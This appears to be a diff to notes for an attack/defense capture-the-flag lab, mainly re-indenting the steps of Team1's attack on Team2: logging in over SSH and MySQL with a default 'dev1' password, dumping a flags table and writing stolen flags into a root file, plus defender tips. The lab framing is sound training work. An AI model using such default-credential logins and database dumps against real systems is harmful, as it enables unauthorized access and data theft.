@@ -21,22 +21,22 @@ db docker is configured attending to the following tips:
 - The defender should change 'dev1' user's password. It has to change dev1 db user password and remove all the users created. It cas to remove or restrict access to create_user.php and show_info.php.
   
   Attack performed by Team1 against Team 2. 
-  Inspect web page in 10.0.1.101
-      We can create user.
-      We can check flags.
-  ssh -p 2222 dev1@10.0.1.101
-        Enter 'dev1_password' as password
-  mysql -h 10.0.1.101 -P 3306 -u dev1 -p
-  USE faulty_db;
-  SELECT * FROM flags;
-     Copy last flags
-     Exit
+    Inspect web page in 10.0.1.101
+        We can create user.
+        We can check flags.
+    ssh -p 2222 dev1@10.0.1.101
+          Enter 'dev1_password' as password
+    mysql -h 10.0.1.101 -P 3306 -u dev1 -p
+    USE faulty_db;
+    SELECT * FROM flags;
+      Copy last flags
+      Exit
 
-     Aldatu....
-  'ssh -i /home/urko/Deskargak/keyak/team2-sshkey root@10.0.1.1'
-  nano /root/xxx.flag
+    
+    'ssh -i /home/isard/Documents/keyak/team2-sshkey root@10.0.1.1'
+    nano /root/xxx.flag
     Paste copied flags. 
-    ...
+
 
   Defense performed by Team2
      'ssh root@10.0.0.102'
